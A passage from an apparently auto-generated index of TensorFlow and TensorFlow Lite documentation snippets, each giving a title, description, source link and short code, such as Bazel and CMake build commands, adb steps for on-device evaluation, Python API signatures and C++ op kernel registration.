DESCRIPTION: This command clones the official TensorFlow examples GitHub repository to your local machine. This repository contains the sample code used in the tutorial for building the Android object detection application. Ensure you have Git installed and configured.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_0

LANGUAGE: Shell
CODE:
```
git clone https://github.com/tensorflow/examples.git
```

----------------------------------------

TITLE: Initializing BrowserFftSpec Class (Python)
DESCRIPTION: Initializes the BrowserFftSpec class, used for creating audio classification models tailored for speech commands with Browser FFT spectrum. Accepts optional parameters for the directory to save model checkpoints and a TensorFlow distribution strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.audio_classifier.BrowserFftSpec(
    model_dir=None, strategy=None
)
```

----------------------------------------

TITLE: Build and Install Native flatc Compiler (CMake)
DESCRIPTION: Builds the `flatc` compiler using CMake and installs it to a custom directory specified by `CMAKE_INSTALL_PREFIX`. This is an alternative to the previous snippet, allowing for better organization of host-built tools required for cross-compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_10

LANGUAGE: sh
CODE:
```
cmake -DCMAKE_INSTALL_PREFIX=<native_tools_dir> ../tensorflow_src/tensorflow/lite/tools/cmake/native_tools/flatbuffers
cmake --build .
```

----------------------------------------

TITLE: Setting TensorFlow Package and Output Paths (CMake)
DESCRIPTION: Defines CMake variables to configure build paths. `TENSORFLOW_PACKAGE_PATH` stores the location of the TensorFlow Python package installation, used for finding headers and runtime sources. This variable is cached, allowing users to specify an alternative path. `CMAKE_ARCHIVE_OUTPUT_DIRECTORY` sets the output location for built static and shared libraries within the build directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set(TENSORFLOW_PACKAGE_PATH "/usr/local/lib/python3.9/dist-packages/tensorflow"
    CACHE STRING "Full path of tensorflow python package")

set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
```

----------------------------------------

TITLE: Listing TFLite Files and Sizes Shell
DESCRIPTION: Executes a shell command (!ls -lh) within the notebook environment to list the files ending with .tflite in the specified directory, displaying their sizes in a human-readable format to show the effect of quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_7

LANGUAGE: shell
CODE:
```
!ls -lh {tflite_models_dir}
```

----------------------------------------

TITLE: Running Gemma2 Keras Setup Script (Bash)
DESCRIPTION: Executes the `setup.sh` script to create a Python virtual environment and install necessary dependencies for running the Gemma2 Keras model. This script should be run only once. The location of the virtual environment can be adjusted by changing the `VENV_BASE` variable in `config.sh`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/keras/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bash setup.sh
```

----------------------------------------

TITLE: Defining Shared Library Build Option - CMake
DESCRIPTION: Defines a boolean option `TFLITE_C_BUILD_SHARED_LIBS` which defaults to ON. This option controls whether the TensorFlow Lite C API should be built as a shared library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
option(TFLITE_C_BUILD_SHARED_LIBS "Build shared libraries" ON)
```

----------------------------------------

TITLE: Initializing from Packed FlatBuffers Buffer Python
DESCRIPTION: This class method initializes an instance of `SentencePieceTokenizerOptionsT` from a packed FlatBuffers buffer format. It requires the packed buffer and an optional starting position (defaulting to 0) to correctly parse the serialized data. This is another common method for deserializing FlatBuffers objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Accessing Output Process Units in Python
DESCRIPTION: Accesses a specific entry in the list of output process units. This method allows retrieval of output process unit configurations by their index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_20

LANGUAGE: python
CODE:
```
OutputProcessUnits(
    j
)
```

----------------------------------------

TITLE: Accessing Delimiter Regex Pattern in Python
DESCRIPTION: Retrieves the delimiter regular expression pattern string stored in the `RegexTokenizerOptions` object. This pattern is used by the tokenizer to split the input text.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
DelimRegexPattern()
```

----------------------------------------

TITLE: Implementing Equality Comparison __eq__ - Python
DESCRIPTION: This snippet provides the signature for the `__eq__` method of the `NearestNeighbor` class. It takes another object (`other`) and returns `True` if the current `NearestNeighbor` instance is considered equal to `other`, typically comparing its attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/NearestNeighbor.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Initialize ImageSize Object Position Python
DESCRIPTION: This method initializes an ImageSize object by linking it to a specific buffer and position. It is typically used internally by the FlatBuffers library or when you need to manually set up the object's underlying buffer reference. It prepares the instance to access data from the specified location.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_4

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Registering TensorFlow Simple Hash Table Kernels (C++)
DESCRIPTION: Registers specific implementations of the simple hash table TensorFlow kernels for various combinations of key and value data types (int32, int64_t, tstring, double, float, bool) by calling the previously defined `REGISTER_KERNEL` macro.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_10

LANGUAGE: C++
CODE:
```
REGISTER_KERNEL(int32, double);
REGISTER_KERNEL(int32, float);
REGISTER_KERNEL(int32, int32);
REGISTER_KERNEL(int32, tstring);
REGISTER_KERNEL(int64_t, double);
REGISTER_KERNEL(int64_t, float);
REGISTER_KERNEL(int64_t, int32);
REGISTER_KERNEL(int64_t, int64_t);
REGISTER_KERNEL(int64_t, tstring);
REGISTER_KERNEL(tstring, bool);
REGISTER_KERNEL(tstring, double);
REGISTER_KERNEL(tstring, float);
REGISTER_KERNEL(tstring, int32);
REGISTER_KERNEL(tstring, int64_t);
REGISTER_KERNEL(tstring, tstring);
```

----------------------------------------

TITLE: Importing Orbax Export Modules
DESCRIPTION: Imports necessary classes from the orbax.export library, specifically ExportManager, JaxModule, and ServingConfig, required for facilitating the JAX model export process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_4

LANGUAGE: Python
CODE:
```
from orbax.export import ExportManager
from orbax.export import JaxModule
from orbax.export import ServingConfig
```

----------------------------------------

TITLE: Building and Running TFLite Benchmark Tool with Delegate (Shell)
DESCRIPTION: These commands illustrate how to build the custom benchmark tool binary (created in the previous step) using Bazel and then run it. The `--use_dummy_delegate=true` flag activates the delegate, and `--graph=/tmp/mobilenet-v2.tflite` specifies the model to benchmark.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel build -c opt tensorflow/lite/delegates/utils/dummy_delegate:benchmark_model_plus_dummy_delegate

# Setting --use_dummy_delegate=true will apply the dummy delegate to the
# TFLite model graph.
bazel-bin/tensorflow/lite/delegates/utils/dummy_delegate/benchmark_model_plus_dummy_delegate --graph=/tmp/mobilenet-v2.tflite --use_dummy_delegate=true
```

----------------------------------------

TITLE: Analyzing Generic Bazel Profile (Bazel)
DESCRIPTION: This Bazel command is used to analyze a build or test performance profile. The profile data helps identify bottlenecks and areas for optimization in the build or execution process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_4

LANGUAGE: Bazel
CODE:
```
bazel analyze-profile ...
```

----------------------------------------

TITLE: Setting TFLite Target Options/Dependencies (GPU) CMake
DESCRIPTION: These lines are part of the GPU delegate configuration block and append specific compiler options (`-DCL_DELEGATE_NO_GL`, `-DEGL_NO_X11`) to the `TFLITE_TARGET_PUBLIC_OPTIONS` list and link dependencies (`absl::any`, `absl::flat_hash_map`) to the `TFLITE_TARGET_DEPENDENCIES` list when the GPU delegate is enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_30

LANGUAGE: CMake
CODE:
```
list(APPEND TFLITE_TARGET_PUBLIC_OPTIONS "-DCL_DELEGATE_NO_GL" "-DEGL_NO_X11")
  list(APPEND TFLITE_TARGET_DEPENDENCIES
    absl::any
    absl::flat_hash_map
  )
endif()
```

----------------------------------------

TITLE: Reorder Input Details Method Python
DESCRIPTION: Reorders the TFLite input details to match the order of the Keras model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_7

LANGUAGE: python
CODE:
```
reorder_input_details(
    tflite_input_details
)
```

----------------------------------------

TITLE: Building MHLO Python API using CMake/Ninja (Shell)
DESCRIPTION: Provides the steps to build the MHLO Python API as an external LLVM project. This process involves configuring CMake with specific flags to include MLIR and MHLO bindings, building the necessary modules using Ninja, and setting the PYTHONPATH to make the built package importable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
mkdir build && cd build
cmake -GNinja -B. ${LLVM_SRC_DIR}/llvm \
    -DCMAKE_BUILD_TYPE=Release \
    -DLLVM_ENABLE_PROJECTS=mlir \
    -DLLVM_EXTERNAL_PROJECTS=mlir_hlo \
    -DLLVM_EXTERNAL_MLIR_HLO_SOURCE_DIR=${MLIR_HLO_SRC_DIR} \
    -DLLVM_TARGETS_TO_BUILD=host \
    -DPython3_EXECUTABLE=$(which python) \
    -DMLIR_ENABLE_BINDINGS_PYTHON=ON \
    -DMHLO_ENABLE_BINDINGS_PYTHON=ON

ninja MLIRHLOPythonModules
export PYTHONPATH=$PWD/tools/mlir_hlo/python_packages/mlir_hlo
python -c "import mlir.dialects.mhlo"
```

----------------------------------------

TITLE: Creating MetadataWriter from Flatbuffers Objects (Python)
DESCRIPTION: Creates a MetadataWriter instance based on TFLite metadata represented as Flatbuffers Python objects (ModelMetadataT, TensorMetadataT, etc.). This method takes the raw model buffer and various optional Flatbuffers objects defining the model, input/output tensor metadata, associated files, and input/output processing units. It returns a MetadataWriter object that can then be used to populate the metadata into the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[<a href="../../../../tflite_support/metadata_schema_py_generated/ModelMetadataT"><code>tflite_support.metadata_schema_py_generated.ModelMetadataT</code></a>] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Building TensorFlow wav_to_spectrogram Example - Bash
DESCRIPTION: This command uses Bazel to build the TensorFlow `wav_to_spectrogram` example and all its dependencies. It compiles the source code into an executable binary. Required dependency is Bazel installed and configured for TensorFlow development.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/wav_to_spectrogram/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bazel build tensorflow/examples/wav_to_spectrogram/...
```

----------------------------------------

TITLE: Running Inference Diff Tool Android ADB
DESCRIPTION: This `adb shell` command executes the Inference Diff tool binary directly on the Android device. It specifies the path to the tool and provides required arguments like `--model_file` and optional arguments like `--delegate` to configure the test run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/inference_diff/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
adb shell /data/local/tmp/run_eval \
  --model_file=/data/local/tmp/mobilenet_v1_1.0_224.tflite \
  --delegate=gpu
```

----------------------------------------

TITLE: Cross-Compile TFLite Pip via Docker/Make - ARM64 (Shell)
DESCRIPTION: Initiates a Docker-based cross-compilation build for the TensorFlow Lite pip package using the `make` tool. This specific command targets the ARM64 architecture (`aarch64`) with Debian Stretch (`BASE_IMAGE`) and Python 3.5 (`PYTHON_VERSION`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_3

LANGUAGE: sh
CODE:
```
make BASE_IMAGE=debian:stretch PYTHON_VERSION=3.5 TENSORFLOW_TARGET=aarch64 docker-build
```

----------------------------------------

TITLE: Registering Custom Hardware Backend (C++)
DESCRIPTION: Shows the process of registering a newly defined hardware backend, `FooHardware`, with the TAC system. It involves creating a factory function (`CreateFooHardware`) and using the `TargetHardwareRegistration` template to make the hardware available by its ID. Required dependency: `TargetHardwareRegistration`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
std::unique_ptr<TargetHardware> CreateFooHardware() {
  return std::make_unique<FooHardware>();
}

TargetHardwareRegistration<FooHardware> foo_hardware(
    "Target device for FOO", CreateFooHardware);
```

----------------------------------------

TITLE: Initializing CluResponse Class (Python)
DESCRIPTION: Creates an instance of the `CluResponse` class, representing the parsed output of a CLU task. It stores lists of predicted domains, intents, categorical slots, and mentioned slots.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CluResponse.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.CluResponse(
    domains: List[tflite_support.task.processor.Category],
    intents: List[tflite_support.task.processor.Category],
    categorical_slots: List[tflite_support.task.processor.CategoricalSlot],
    mentioned_slots: List[tflite_support.task.processor.MentionedSlot]
)
```

----------------------------------------

TITLE: Building Custom TensorFlow Op (Shell)
DESCRIPTION: This shell command uses the Bazel build tool to compile and package the 'multiplex_3' custom TensorFlow op. It targets the 'py_strict_library' rule named 'multiplex_3_op', which ensures that both the C++ kernel and the Python wrapper are built and made available for use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_12

LANGUAGE: Shell
CODE:
```
bazel build //third_party/tensorflow/examples/custom_ops_doc/multiplex_3:multiplex_3_op
```

----------------------------------------

TITLE: Select Data from Record Method Python
DESCRIPTION: Dispatches records into features and labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_10

LANGUAGE: python
CODE:
```
select_data_from_record(
    record
)
```

----------------------------------------

TITLE: Checking Equality of SearchOptions Python
DESCRIPTION: Compares the current `SearchOptions` object with another object to determine if they are equal. Equality is typically determined by comparing the values of all attributes of the `SearchOptions` instances. This method is part of the standard Python object comparison protocol.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SearchOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Declaring Core Python Dependencies (CI)
DESCRIPTION: Specifies the required versions for fundamental Python libraries used in TensorFlow's CI builds, including core dependencies, utility libraries, and build tools. Versions are typically pinned using the `~=` (compatible release) or `==` (exact) specifiers for reproducibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_0

LANGUAGE: pip requirements
CODE:
```
absl-py ~= 1.0.0
astunparse ~= 1.6.3
flatbuffers ~= 24.3.25
google_pasta ~= 0.2
h5py ~= 3.11.0 # Earliest version for NumPy 2.0
ml_dtypes ~= 0.5.1 # Earliest version with mxfloat types
# TODO(b/366266944): Support older versions of NumPy to support TFX. Remove when
# Apache Beam upgrades to newer NumPy.
numpy ~= 1.26.0
opt_einsum ~= 3.3.0
packaging ~= 23.2
protobuf ~= 3.20.3
six ~= 1.16.0
termcolor ~= 2.1.1
typing_extensions ~= 4.8.0
wheel ~= 0.41.2
setuptools >= 70.0.0
wrapt ~= 1.14.1
# We need to pin the gast dependency exactly
gast == 0.4.0
```

----------------------------------------

TITLE: Defining TensorFlow Custom Op Kernel Registration Macro (C++)
DESCRIPTION: Defines a C++ preprocessor macro `REGISTER_KERNEL` to simplify the registration of TensorFlow kernel builders for hash table operations (Create, Find, Insert, Remove, Export, Import) for specific key and value data types, targeting the CPU device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_9

LANGUAGE: C++
CODE:
```
#define REGISTER_KERNEL(key_dtype, value_dtype)               \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableCreate")                  \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableCreateOpKernel<key_dtype, value_dtype>); \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableFind")                    \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableFindOpKernel<key_dtype, value_dtype>);   \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableInsert")                  \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableInsertOpKernel<key_dtype, value_dtype>)  \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableRemove")                  \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableRemoveOpKernel<key_dtype, value_dtype>)  \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableExport")                  \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableExportOpKernel<key_dtype, value_dtype>)  \
  REGISTER_KERNEL_BUILDER(                                    \
      Name("Examples>SimpleHashTableImport")                  \
          .Device(DEVICE_CPU)                                 \
          .TypeConstraint<key_dtype>("key_dtype")             \
          .TypeConstraint<value_dtype>("value_dtype"),        \
      SimpleHashTableImportOpKernel<key_dtype, value_dtype>);
```

----------------------------------------

TITLE: Using TensorFlow C++ Op Code Generator (Shell)
DESCRIPTION: This snippet shows the command-line usage for the `generate_cpp` tool. It requires specifying the operation names to generate code for, and allows optional flags to control the output directory, namespace, category, and source/API definition directories. This tool is used to generate C++ source code for TensorFlow operations based on their definitions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/c/experimental/ops/gen/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
usage: generate_cpp  [flags]  OpName1 [OpName2 ...]
Flags:
    --help=false                        bool    Print this help message.
    --category=""                       string  Category for generated ops (e.g. 'math', 'array').
    --namespace=""                       string  Compact C++ namespace, default is 'tensorflow::ops'.
    --output_dir=""                       string  Directory into which output files will be generated.
    --source_dir=""                       string  The tensorflow root directory, e.g. 'tensorflow/' for in-source include paths. Any path underneath the tensorflow root is also accepted.
    --api_dirs=""                       string  Comma-separated list of directories containing API definitions.
```

----------------------------------------

TITLE: Push TFLite Model to Android Device - Shell
DESCRIPTION: Transfers the TFLite model file (`ssd_mobilenet_v1_float.tflite` in this example) from the local machine to the temporary directory (`/data/local/tmp`) on the connected Android device using ADB.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_4

LANGUAGE: Shell
CODE:
```
adb push ssd_mobilenet_v1_float.tflite /data/local/tmp
```

----------------------------------------

TITLE: Including Required Headers for TensorFlow Op Definition in C++
DESCRIPTION: Includes the necessary TensorFlow headers for defining a custom operation. `tensorflow/core/framework/op.h` is required for the `REGISTER_OP` macro, and `tensorflow/core/framework/shape_inference.h` is needed for defining the shape inference function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_2

LANGUAGE: c++
CODE:
```
#include "tensorflow/core/framework/op.h"
#include "tensorflow/core/framework/shape_inference.h"
```

----------------------------------------

TITLE: Validating TensorFlow Tensor Shapes in C++
DESCRIPTION: This C++ snippet from the `DenseCountSparseOutput` implementation demonstrates how TensorFlow uses the `OP_REQUIRES` macro to validate that the shapes of the `weights` tensor and the `data` tensor are identical when weights are used. If the shapes differ, an `InvalidArgument` error is raised.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-020.md#_snippet_0

LANGUAGE: C++
CODE:
```
    if (use_weights) {
      OP_REQUIRES(
          context, weights.shape() == data.shape(),
          errors::InvalidArgument(
              "Weights and data must have the same shape. Weight shape: ",
              weights.shape().DebugString(),
              "; data shape: ", data.shape().DebugString()));
    }

```

----------------------------------------

TITLE: Defining Custom Op Types with OpLogProto Python
DESCRIPTION: This Python snippet demonstrates how to create an `OpLogProto` and add `LogEntry` instances to associate custom operation types ('pool_logit') with specific operation names ('pool_logit/DW', 'pool_logit/biases') for profiling with tfprof. This allows grouping or filtering operations by custom criteria in the profiler.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/command_line.md#_snippet_0

LANGUAGE: python
CODE:
```
op_log = tfprof_log_pb2.OpLogProto()
entry = op_log.log_entries.add()
entry.name = 'pool_logit/DW'
entry.types.append('pool_logit')
entry = op_log.log_entries.add()
entry.name = 'pool_logit/biases'
entry.types.append('pool_logit')
```

----------------------------------------

TITLE: Linking TensorFlow Lite C API to Core Library - CMake
DESCRIPTION: Links the newly defined `tensorflowlite_c` library target to the main `tensorflow-lite` library target. This ensures that the C API library has access to the symbols and functionality provided by the core TensorFlow Lite library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_10

LANGUAGE: CMake
CODE:
```
target_link_libraries(tensorflowlite_c
  tensorflow-lite
)
```

----------------------------------------

TITLE: Calling tf.function to Show Print Precedence (Python/TensorFlow)
DESCRIPTION: This snippet executes the `tf.function f` defined previously with a `tf.constant(1)`. It confirms that the output message from the `print` statement appears before the output message from the `tf.print` statement, demonstrating the distinct execution phases (construction vs. execution) regardless of code order.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_10

LANGUAGE: python
CODE:
```
f(tf.constant(1))
```

----------------------------------------

TITLE: Using TensorFlow Custom Hash Table Op (Python)
DESCRIPTION: This snippet demonstrates how to instantiate and use the `SimpleHashTable` Python wrapper. It imports the necessary modules, creates a table instance with specified key/value dtypes and a default value, performs a `find` operation before insertion, and then performs `insert` and another `find` operation to show the updated state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_23

LANGUAGE: Python
CODE:
```
import tensorflow as tf

from tensorflow.examples.custom_ops_doc.simple_hash_table import simple_hash_table

hash_table = simple_hash_table.SimpleHashTable(tf.int32, float, -999.0)
result1 = hash_table.find(1, -999.0)  # -999.0
hash_table.insert(1, 100.0)
result2 = hash_table.find(1, -999.0)  # 100.0
```

----------------------------------------

TITLE: Uninstalling TensorFlow Python Package
DESCRIPTION: Removes any existing TensorFlow installations to ensure a clean environment before installing specific versions. This is a common first step in setting up environments with potentially conflicting package versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
!pip uninstall tensorflow --yes
```

----------------------------------------

TITLE: Run Object Detection Evaluation on Desktop - Bazel/Shell
DESCRIPTION: Builds and immediately runs the evaluation binary on the desktop system using Bazel. Requires paths to the TFLite model, ground truth images, ground truth proto, output labels, and specifies the output file path for metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_8

LANGUAGE: Bazel/Shell
CODE:
```
bazel run -c opt \
  -- \
  //tensorflow/lite/tools/evaluation/tasks/coco_object_detection:run_eval \
  --model_file=/path/to/ssd_mobilenet_v1_float.tflite \
  --ground_truth_images_path=/path/to/images \
  --ground_truth_proto=/path/to/ground_truth.pb \
  --model_output_labels=/path/to/labelmap.txt \
  --output_file_path=/path/to/coco_output.txt
```

----------------------------------------

TITLE: Build TFLite Benchmark Framework (Shell)
DESCRIPTION: Executes the shell script to build the TFLite benchmark framework targeting iOS arm64. The resulting framework is placed under the `TFLiteBenchmark/TFLiteBenchmark/Frameworks` directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/ios/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
build_benchmark_framework.sh
```

----------------------------------------

TITLE: Packing ScoreThresholdingOptionsT into Builder in Python
DESCRIPTION: This method serializes the current `ScoreThresholdingOptionsT` object into a FlatBuffers builder. It is used to prepare the object's data for writing into a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Adding Linker Flag for Select TF Ops (Bazel Framework) - Text
DESCRIPTION: This text snippet provides the required `-force_load` linker flag setting for Xcode project build settings when using the select TensorFlow ops framework built with Bazel, specifying the placeholder path to the framework file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_10

LANGUAGE: text
CODE:
```
-force_load <path/to/your/TensorFlowLiteSelectTfOps.framework/TensorFlowLiteSelectTfOps>
```

----------------------------------------

TITLE: Importing TensorFlow and Libraries - Python
DESCRIPTION: This code block imports the necessary libraries for the tutorial, including TensorFlow, TensorFlow Experimental NumPy, standard NumPy, OS, and time. These imports are required to set up the environment and use the functions and classes for building and training the text generation model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import tensorflow.experimental.numpy as tnp

import numpy as np
import os
import time
```

----------------------------------------

TITLE: Running TensorFlow C++ Detector on Default Image bash
DESCRIPTION: This command executes the built `detect_objects` binary, running the object detection process on the default example image included with the framework. The `--image_out` argument specifies the path where the output image with detected objects labeled will be saved for visual inspection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/multibox_detector/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/multibox_detector/detect_objects --image_out=$HOME/x20/surfers_labeled.png
```

----------------------------------------

TITLE: Creating MetadataWriter from Flatbuffers Objects (Python)
DESCRIPTION: This class method constructs a MetadataWriter using pre-existing metadata represented as Flatbuffers Python objects. It requires the model buffer and allows specifying optional model metadata, input/output tensor metadata, associated files, and input/output process units using their corresponding Flatbuffers object types. This method is useful when metadata is already structured in the Flatbuffers format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/ModelMetadataT"><code>tflite_support.metadata_schema_py_generated.ModelMetadataT</code></a>] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Building TFLite Flex Shared Library (Android) - Shell
DESCRIPTION: This shell command builds the TensorFlow Lite Flex delegate shared library specifically for Android using Bazel. It uses C++17 standard, optimization, Android configuration, monolithic config, and specifies the host crosstool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_12

LANGUAGE: Shell
CODE:
```
bazel build -c opt --cxxopt='--std=c++17' \
      --config=android_arm \
      --config=monolithic \
      --host_crosstool_top=@bazel_tools//tools/cpp:toolchain \
      //tmp:tensorflowlite_flex
```

